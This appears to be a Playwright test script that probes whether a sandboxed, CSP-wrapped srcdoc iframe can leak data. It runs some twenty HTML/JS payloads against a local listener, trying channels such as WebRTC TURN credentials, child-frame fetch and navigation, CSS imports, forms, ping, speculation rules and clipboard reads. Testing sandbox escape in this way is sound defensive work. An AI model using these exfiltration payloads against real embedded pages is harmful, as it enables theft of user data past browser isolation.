import http from 'node:http';
import dgram from 'node:dgram';
import { createRequire } from 'node:module';
const require = createRequire('/home/uni/Code/uni-app-contract/package.json');
const { chromium } = require('@playwright/test');
const { buildSrcdoc: __b } = await import('../../src/interface/srcdoc.ts'); const { FRAME_KIT } = await import('../../src/interface/kits/frameKit.ts'); const buildSrcdoc = (h) => __b(h, { kitSource: FRAME_KIT, headExtra: '' });

let hostBody='';
const hostSrv = http.createServer((q,r)=>{r.writeHead(200,process.env.PCSP?{'content-type':'text/html','content-security-policy':process.env.PCSP}:{'content-type':'text/html'});r.end(hostBody)}).listen(1447);
const hits = [];
const leak = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, {'content-type':'text/html','access-control-allow-origin':'*'}); res.end('ok'); }).listen(1446);
const udp = dgram.createSocket('udp4'); const udpHits = []; udp.on('message', (m) => udpHits.push(m.toString('latin1'))); udp.bind(1448, '127.0.0.1');
const L='http://127.0.0.1:1446/leak', T='turn:127.0.0.1:1448';
const report = (code) => `<pre id=o></pre><script>(async()=>{const R={};${code};parent.postMessage({rep:R},'*')})()</script>`;
const cases = {
  // child frame realm: does a fresh about:blank child give back RTCPeerConnection?
  childRtc: report(`const f=document.createElement('iframe');document.body.appendChild(f);try{R.type=typeof f.contentWindow.RTCPeerConnection;const pc=new f.contentWindow.RTCPeerConnection({iceServers:[{urls:'${T}',username:'SECRETUSER',credential:'x'}]});pc.createDataChannel('x');await pc.setLocalDescription(await pc.createOffer());R.ok='offered'}catch(e){R.err=String(e)}await new Promise(r=>setTimeout(r,1500))`),
  childSrcdocRtc: report(`const f=document.createElement('iframe');f.srcdoc='<script>try{var pc=new RTCPeerConnection({iceServers:[{urls:"${T}",username:"SECRETUSER2",credential:"x"}]});pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o))}catch(e){}<\\/script>';document.body.appendChild(f);await new Promise(r=>setTimeout(r,1500))`),
  childNav: report(`const f=document.createElement('iframe');document.body.appendChild(f);try{f.contentWindow.location.href='${L}?childnav=SECRET'}catch(e){R.e1=String(e)}try{f.contentDocument.write('<img src="${L}?childwrite=SECRET">')}catch(e){R.e2=String(e)} await new Promise(r=>setTimeout(r,1500))`),
  childSrc: report(`const f=document.createElement('iframe');f.src='${L}?childsrc=SECRET';document.body.appendChild(f);await new Promise(r=>setTimeout(r,1500))`),
  childFetch: report(`const f=document.createElement('iframe');document.body.appendChild(f);try{await f.contentWindow.fetch('${L}?childfetch=SECRET',{mode:'no-cors'});R.f='sent'}catch(e){R.e=String(e)}await new Promise(r=>setTimeout(r,800))`),
  childImg: report(`const f=document.createElement('iframe');document.body.appendChild(f);try{const i=new f.contentWindow.Image();i.src='${L}?childimg=SECRET';}catch(e){R.e=String(e)}await new Promise(r=>setTimeout(r,800))`),
  objectData: `<object data="${L}?object=SECRET"></object><embed src="${L}?embed=SECRET">`,
  preloadNav: `<script>location.href='${L}?preload=SECRET'</script>`,
  metaFirst: `<meta http-equiv=refresh content="0;url=${L}?metafirst=SECRET">`,
  ws: report(`try{new WebSocket('ws://127.0.0.1:1446/ws')}catch(e){}try{new EventSource('${L}?es=SECRET')}catch(e){}try{new WebTransport('https://127.0.0.1:1446/wt')}catch(e){}await new Promise(r=>setTimeout(r,800))`),
  worker: report(`try{new Worker(URL.createObjectURL(new Blob(['fetch("${L}?worker=SECRET")'])))}catch(e){R.e=String(e)}try{navigator.serviceWorker.register('/sw.js')}catch(e){R.sw=String(e)}await new Promise(r=>setTimeout(r,800))`),
  ping: `<a id=a href="#" ping="${L}?ping=SECRET">x</a><script>document.getElementById('a').click()</script>`,
  speculation: `<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${L}?spec=SECRET"]}]}</script>`,
  stylesheet: `<style>@import url("${L}?import=SECRET"); body{background:url("${L}?bgurl=SECRET")}</style><link rel=stylesheet href="${L}?link=SECRET">`,
  formTarget: `<form id=f method=get action="${L}?form=SECRET"><button formaction="${L}?formaction=SECRET" id=b>x</button></form><script>document.getElementById('b').click()</script>`,
  svgUse: `<svg><image href="${L}?svgimg=SECRET"/></svg><img srcset="${L}?srcset=SECRET 1x">`,
  mediaTag: `<video src="${L}?video=SECRET" autoplay></video><audio src="${L}?audio=SECRET" autoplay></audio>`,
  windowNameHack: report(`try{window.open('about:blank','_blank')}catch(e){}try{parent.location='${L}?parentloc=SECRET'}catch(e){R.pl=String(e)}try{top.location.replace('${L}?toploc=SECRET')}catch(e){R.tl=String(e)}await new Promise(r=>setTimeout(r,800))`),
  permissions: report(`try{await navigator.mediaDevices.getUserMedia({audio:true});R.gum='granted'}catch(e){R.gum=String(e)}try{R.clip=await navigator.clipboard.readText()}catch(e){R.clip=String(e)}`),
};
const browser = await chromium.launch({args:['--use-fake-device-for-media-stream','--use-fake-ui-for-media-stream']});
const page = await browser.newPage();
const results = {};
for (const [name, body] of Object.entries(cases)) {
  hits.length = 0; udpHits.length = 0;
  const html = process.env.NOCSP ? body : buildSrcdoc(body);
  hostBody = `<!doctype html><body><iframe sandbox="allow-scripts" id=f></iframe><script>window.addEventListener('message',e=>{window.__rep=e.data});document.getElementById('f').srcdoc=${JSON.stringify(html).replace(/</g,"\\u003c")}</script>`;
  await page.goto('http://127.0.0.1:1447/');
  await page.waitForTimeout(2800);
  results[name] = { http: [...hits], udp: udpHits.length, udpSecret: udpHits.some(x=>/SECRETUSER/.test(x)), rep: await page.evaluate(()=>window.__rep && JSON.stringify(window.__rep)) };
}
for (const [k,v] of Object.entries(results)) console.log(k.padEnd(16), 'http', JSON.stringify(v.http), 'udp', v.udp, v.udpSecret?'USERNAME-LEAK':'', v.rep||'');
await browser.close(); leak.close(); hostSrv.close(); udp.close();
